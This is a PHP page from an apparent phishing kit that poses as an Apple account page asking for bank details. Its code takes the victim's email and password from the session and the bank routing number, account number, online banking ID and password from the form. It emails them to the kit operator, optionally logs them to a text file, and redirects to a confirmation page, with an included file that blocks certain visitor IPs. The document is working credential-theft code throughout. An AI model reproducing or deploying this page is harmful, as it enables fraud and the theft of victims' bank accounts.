<?php
	
session_start();
error_reporting(0);
include "bots.php";  //Para Bloquear Algunas IPs / tikchbila tiwliwla ma9tloni ma7wawni ghir spam bach blawni 
include ('config.php');

if(isset($_POST['Sort'])){




$subject  = "Apple Bank - [ " . $_SESSION['_IP_']  . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: 	Apple <schlive@live.com>" . "\r\n";


$message = "

<div style='font-family: Tahoma;line-height: 25px;color: #333;font-size: 14px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;'>

IP              =>   <font color='#3366FF'>".$_SESSION['_IP_']."</font><br />
TIME            =>   <font color='#3366FF'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#3366FF'>".$_SESSION['_browser_']."</font><br />
USER AGENT      =>   <font color='#3366FF'>".$_SERVER['HTTP_USER_AGENT']."</font><br />
EMAIL           =>   <font color='#3366FF'>".$_SESSION['_email_']."</font><br />
PASSWORD        =>   <font color='#3366FF'>".$_SESSION['_password_']."</font><br />

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

ROUT NUMBER:    =>   <font color='#3366FF'>".$_POST['Sort']."</font><br />
ACCOUNT NUMBER: =>   <font color='#3366FF'>".$_POST['accountNumber']."</font><br />
ID/ USERNAME    =>   <font color='#3366FF'>".$_POST['logId']."</font><br />
PASSWD          =>   <font color='#3366FF'>".$_POST['passId']."</font><br />
nameofbnk       =>   <font color='#3366FF'>".$_POST['nameofbnk']."</font><br />
accountType     =>   <font color='#3366FF'>".$_POST['accountType']."</font><br />

___________________________________________________________________
<br />
|| ~ BY ~ Uk747 Dz ~ ||
<br />
</div>";


if($_txt == 1){
$message_txt = "

__________________________________________________________________________________________________________

IP              =>   ".$_SERVER["REMOTE_ADDR"]."
TIME            =>   ".date('l jS \of F Y h:i:s A')."
EMAIL           =>   ".$_SESSION['_email_']."
PASSWORD        =>   ".$_SESSION['_password_']."
__________________________________________________________________________________________________________

ROUT NUMBER:    =>   ".$_POST['Sort']."
ACCOUNT NUMBER: =>   ".$_POST['accountNumber']."
ID/ USERNAME    =>   ".$_POST['logId']."
PASSWD          =>   ".$_POST['passId']."
nameofbnk       =>   ".$_POST['nameofbnk']."
accountType     =>   ".$_POST['accountType']."
";
		$v = fopen("../bank.txt","a");
		fwrite($v,$message_txt);
		fclose($v);
		}
		
		

		@mail($to,$subject,$message,$headers);
		header("Location: confirming.php");

}
	?>
<html>
<head>
	<title> My lD Account </title>
	<meta name="robots" content="noindex">

		<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
		<meta name="viewport" content="width=device-width, maximum-scale=1.0, user-scalable=1" />
		
		<link  rel="logo-icon" href="../set/img/iconisma.ico"/>
		
		<link rel="stylesheet" href="../set/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="../set/css/bootstrap-theme.min.css"/>
		<link rel="stylesheet" href="../set/cssisma/tot.css" type="text/css"/>
		<link rel="stylesheet" type="text/css" href="../set/cssisma/mestili-5.css">

		
		<link rel="stylesheet" href="../set/css/styles.css"/>
		<link rel="stylesheet" href="../set/css/app.css">
				
				
				<script src="../set/js/jquery-1.11.0.min.js"></script>
				<script src="../set/js/bootstrap.min.js"></script>
				<script type="text/javascript" src="../set/js/bnnk.js"></script>
			<script src="../set/js/jquery.maskedinput.js" type="text/javascript"></script>





</head>	
		
		
		
	<body style="background:#F3F3F3">

	<?php include("../forms/nav.php")?>

	<div class="container">
		<img src="../set/img/app1e.png" class="img-responsive myapp" />



		<div class="row row2" >
			<div class=" col-xs-4 sidebar mobile-hide" background="blue" >
			<img style="width:100%; position:relative; top:20px;" src="../set/img/Untitled2.png ">
			</div>
			<div class="col-xs-4 loop mobile" style="padding: 20px;">
				<div >
						<img style="width:50%; position:relative; " src="../set/img/bnk.png ">

					<hr/>
				</div>
				<?php include('../forms/bnk.php')?>

			</div>
			<div class="footbar col-xs-12" background="blue" >
				<p style="padding:15px;">Apple uses industry-standard encryption to protect the confidentiality of your personal information.</p>
			</div>
		</div>
		<br/>
		<br/>
		<br/>
		<br/>
		<div class="panel-footer footer" >
			<img src="../set/img/footer.png" class="img-responsive" />
			 </div>
	</div>

</body>

</html>